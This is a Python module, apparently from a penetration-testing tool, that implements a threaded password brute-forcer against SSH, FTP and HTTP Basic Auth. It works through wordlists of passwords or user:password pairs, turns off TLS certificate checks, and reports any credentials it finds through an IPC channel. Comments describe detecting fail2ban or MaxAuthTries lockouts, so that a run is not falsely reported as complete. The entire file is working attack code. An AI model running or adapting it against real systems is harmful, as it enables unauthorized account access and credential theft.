import threading
import time
import os
import socket
import warnings
import ftplib
import paramiko
import requests
from ftplib import FTP

from wordlists_path import resolve_wordlist

try:
    from urllib3.exceptions import InsecureRequestWarning
except Exception:  # pragma: no cover - urllib3 always ships with requests
    InsecureRequestWarning = None


class CredentialResult:
    """Outcome of a single credential attempt.

    Truthy only when the credential was accepted, so legacy `if result:` call
    sites keep working, while callers that care can tell a rejected credential
    apart from a host they could not reach.
    """
    SUCCESS = "success"
    INVALID = "invalid"
    UNREACHABLE = "unreachable"
    UNSUPPORTED = "unsupported"

    def __init__(self, status, detail=""):
        self.status = status
        self.detail = detail

    @property
    def success(self):
        return self.status == self.SUCCESS

    @property
    def unreachable(self):
        return self.status == self.UNREACHABLE

    @property
    def unsupported(self):
        return self.status == self.UNSUPPORTED

    def __bool__(self):
        return self.success

    def __repr__(self):
        return f"CredentialResult({self.status!r}, {self.detail!r})"


class BruteForcer:
    #: Consecutive attempts with no verdict from the host before the run is given
    #: up rather than carried to the end of the wordlist.
    #:
    #: fail2ban's default bans after 5 failures and OpenSSH's `MaxAuthTries` is 6,
    #: so a handful of rejections is normal and must not abort a run. Twenty in a
    #: row is the host having stopped answering, and every attempt after that
    #: produces an UNREACHABLE that cannot be reported as a rejected password.
    UNREACHABLE_GIVE_UP = 20

    def __init__(self, ipc_handler):
        self.ipc = ipc_handler
        self.active_attacks = {}

    def test_credential(self, target_ip, port, service_type, username, password):
        """Test a single credential against one service.

        Returns a CredentialResult. It is truthy on success; on failure the
        status distinguishes a rejected credential (INVALID) from a host that
        could not be reached (UNREACHABLE) and from an unknown service
        (UNSUPPORTED).
        """
        user = username if username else "admin"
        pwd = password if password is not None else ""

        if service_type == "ssh":
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(target_ip, port=port, username=user, password=pwd, timeout=2, banner_timeout=2)
                return CredentialResult(CredentialResult.SUCCESS)
            except paramiko.AuthenticationException as e:
                return CredentialResult(CredentialResult.INVALID, str(e))
            except (paramiko.SSHException, socket.error, OSError) as e:
                # Banner timeout, connection refused, no route, protocol error
                return CredentialResult(CredentialResult.UNREACHABLE, str(e))
            except Exception as e:
                return CredentialResult(CredentialResult.UNREACHABLE, str(e))
            finally:
                try:
                    client.close()
                except Exception:
                    pass

        elif service_type == "ftp":
            ftp = FTP()
            try:
                ftp.connect(target_ip, port, timeout=2)
            except (socket.error, OSError, ftplib.Error) as e:
                return CredentialResult(CredentialResult.UNREACHABLE, str(e))
            except Exception as e:
                return CredentialResult(CredentialResult.UNREACHABLE, str(e))
            try:
                ftp.login(user=user, passwd=pwd)
                return CredentialResult(CredentialResult.SUCCESS)
            except ftplib.error_perm as e:
                # 5xx from the server = credential rejected
                return CredentialResult(CredentialResult.INVALID, str(e))
            except (socket.error, OSError, ftplib.Error) as e:
                return CredentialResult(CredentialResult.UNREACHABLE, str(e))
            except Exception as e:
                return CredentialResult(CredentialResult.UNREACHABLE, str(e))
            finally:
                try:
                    ftp.quit()
                except Exception:
                    try:
                        ftp.close()
                    except Exception:
                        pass

        elif service_type == "http" or service_type == "https":
            proto = "https" if port == 443 else "http"
            try:
                # Basic Auth test — silence urllib3's InsecureRequestWarning for
                # this call only, since verify=False is intentional on pentest targets.
                with warnings.catch_warnings():
                    if InsecureRequestWarning is not None:
                        warnings.simplefilter("ignore", InsecureRequestWarning)
                    res = requests.get(f"{proto}://{target_ip}:{port}/", auth=(user, pwd), timeout=2, verify=False)
                if res.status_code < 400:
                    return CredentialResult(CredentialResult.SUCCESS)
                return CredentialResult(CredentialResult.INVALID, f"HTTP {res.status_code}")
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                return CredentialResult(CredentialResult.UNREACHABLE, str(e))
            except requests.exceptions.RequestException as e:
                return CredentialResult(CredentialResult.UNREACHABLE, str(e))
            except Exception as e:
                return CredentialResult(CredentialResult.UNREACHABLE, str(e))

        return CredentialResult(CredentialResult.UNSUPPORTED, f"Unsupported service: {service_type}")

    def start_attack(self, target_ip, port, service_type, wordlist_name="default-passwords.txt", target_user="admin"):
        attack_id = f"{target_ip}:{port}"
        if attack_id in self.active_attacks:
            return

        self.active_attacks[attack_id] = True
        self.ipc.emit("bruteforce_started", {"target": target_ip, "port": port})

        wordlist_path = resolve_wordlist(wordlist_name)

        def _attack_loop():
            try:
                if not wordlist_path or not os.path.exists(wordlist_path):
                    self.ipc.emit("bruteforce_error", {"target": target_ip, "message": f"Wordlist not found: {wordlist_name}"})
                    return

                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    words = [w.strip() for w in f.readlines() if w.strip()]

                total = len(words)
                if total == 0:
                    self.ipc.emit("bruteforce_error", {"target": target_ip, "message": f"Wordlist is empty: {wordlist_name}"})
                    return

                # How many passwords the host actually evaluated, as against how
                # many were sent. Only the first number can support a statement
                # about passwords that do not work.
                judged = 0
                unreachable = 0
                consecutive_unreachable = 0

                for idx, word in enumerate(words):
                    if not self.active_attacks.get(attack_id):
                        break

                    # Emit progress every 10 words
                    if idx % 10 == 0:
                        self.ipc.emit("bruteforce_progress", {
                            "target": target_ip,
                            "port": port,
                            "progress": int((idx / total) * 100),
                            "current_word": word
                        })

                    # Parse word: either "password" (assume admin/root) or "user:pass"
                    if ':' in word:
                        user, pwd = word.split(':', 1)
                    else:
                        user = target_user if target_user else "admin"
                        pwd = word

                    result = self.test_credential(target_ip, port, service_type, user, pwd)

                    # Counted, not just consulted for success.
                    #
                    # `CredentialResult` was built to separate INVALID from
                    # UNREACHABLE -- its own docstring says so -- and this loop read
                    # `.success` and `.unsupported` and never `.unreachable`. So a
                    # host that stopped answering was indistinguishable from one that
                    # evaluated every password and rejected it, and the run still
                    # ended in `bruteforce_exhausted`: the claim that the whole
                    # wordlist was tried.
                    #
                    # This is routine, not an edge case. An SSH server with fail2ban
                    # or `MaxAuthTries` drops the connection after a handful of
                    # failures; paramiko then raises `SSHException`, which maps to
                    # UNREACHABLE, for every remaining word. A 10,000-word run that
                    # genuinely tested six credentials reported "exhausted". Same for
                    # a host that goes down mid-run, or a port that was closed from
                    # the start.
                    #
                    # `sprayer.py` gets this right and counts unreachable into
                    # `never_judged`, which is what makes the omission here a bug
                    # rather than a difference of opinion.
                    if result.unreachable:
                        unreachable += 1
                        consecutive_unreachable += 1
                        if consecutive_unreachable >= self.UNREACHABLE_GIVE_UP:
                            # The host has stopped judging credentials. Carrying on
                            # would spend hours producing UNREACHABLE and then report
                            # the wordlist as exhausted.
                            self.ipc.emit("bruteforce_aborted", {
                                "target": target_ip,
                                "port": port,
                                "words_attempted": idx + 1,
                                "words_total": total,
                                "judged": judged,
                                "unreachable": unreachable,
                                "reason": (
                                    f"{consecutive_unreachable} consecutive attempts got no "
                                    f"verdict from {target_ip}:{port} ({result.detail or 'unreachable'}). "
                                    "The host is rate-limiting, blocking, or down. "
                                    f"Only {judged} of {total} password(s) were actually judged, so "
                                    "this run is NOT evidence that the rest do not work."
                                ),
                            })
                            return
                    else:
                        consecutive_unreachable = 0
                        if not result.unsupported:
                            judged += 1

                    if result.success:
                        # `credentials` is the display string the UI already
                        # shows. The separate fields exist because the vault has
                        # to store them: splitting "user:pwd" back apart loses
                        # the password the moment one contains a colon, which is
                        # exactly the kind of password a brute force finds.
                        self.ipc.emit("bruteforce_success", {
                            "target": target_ip,
                            "port": port,
                            "service": service_type,
                            "username": user,
                            "password": pwd,
                            "credentials": f"{user}:{pwd}"
                        })
                        self.active_attacks[attack_id] = False
                        return

                    if result.unsupported:
                        self.ipc.emit("bruteforce_error", {"target": target_ip, "message": result.detail})
                        return

                # Exhausted -- but only of what the host actually judged.
                #
                # The figures travel with the event so a reader can tell "every
                # password in this list was rejected by the host" from "the list ran
                # out while the host was refusing to answer". They were not here at
                # all, and the two read identically.
                if self.active_attacks.get(attack_id):
                    self.ipc.emit("bruteforce_exhausted", {
                        "target": target_ip,
                        "port": port,
                        "words_total": total,
                        "judged": judged,
                        "unreachable": unreachable,
                        "complete": unreachable == 0,
                        "caveat": (
                            None if unreachable == 0 else
                            f"{unreachable} of {total} attempt(s) got no verdict from the host, "
                            f"so only {judged} password(s) were actually judged. The rest were "
                            "sent but never evaluated, and their absence from the results is "
                            "not evidence that they do not work."
                        ),
                    })

            except Exception as e:
                self.ipc.emit("bruteforce_error", {"target": target_ip, "message": str(e)})
            finally:
                if attack_id in self.active_attacks:
                    del self.active_attacks[attack_id]

        t = threading.Thread(target=_attack_loop, daemon=True)
        t.start()

    def stop_attack(self, target_ip, port):
        attack_id = f"{target_ip}:{port}"
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id] = False
